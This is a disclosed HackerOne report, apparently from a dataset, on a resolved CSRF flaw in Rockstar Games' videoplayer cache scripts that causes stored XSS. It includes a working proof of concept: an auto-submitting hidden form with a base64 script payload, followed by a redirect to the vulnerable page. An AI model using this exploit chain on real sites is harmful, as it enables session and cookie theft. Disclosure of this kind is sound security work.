---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '152013'
original_report_id: '152013'
title: CSRF in 'set.php' via age causes stored XSS on 'get.php' - http://www.rockstargames.com/php/videoplayer_cache/get.php'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: rockstargames
created_at: '2016-07-18T08:24:10.387Z'
disclosed_at: '2017-03-10T23:15:18.247Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 39
asset_identifier: '*.rockstargames.com'
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in 'set.php' via age causes stored XSS on 'get.php' - http://www.rockstargames.com/php/videoplayer_cache/get.php'

## Metadata

- HackerOne Report ID: 152013
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: rockstargames
- Disclosed At: 2017-03-10T23:15:18.247Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

#Background:
Sending a POST request to set.php with age='PAYLOAD' will cause a stored XSS on the GET.php file (most likely caused by the cookie, since that's what the `age` is based on). For this vulnerability and in order to demonstrate BOTH CSRF and XSS I have written a simple script (tested on firefox)  that automatically sends the request to set.php and redirects you to the vulnerable file:

#POC:

````
<iframe style="display:none" name="csrf-frame" id="csrf-frame"></iframe><form method="POST" action="http://www.rockstargames.com/php/videoplayer_cache/set.php" target="csrf-frame" id="csrf-form" encType="application/x-www-form-urlencoded"><input type="text" name="age" value='<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==>CLICK ME</a>' /></form><script>document.getElementById("csrf-form").submit();</script><script>var xssframe = document.getElementById('csrf-frame');xssframe.addEventListener("load", function() { window.location='http://www.rockstargames.com/php/videoplayer_cache/get.php'; }); </script>
````

Thanks,
Ben

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
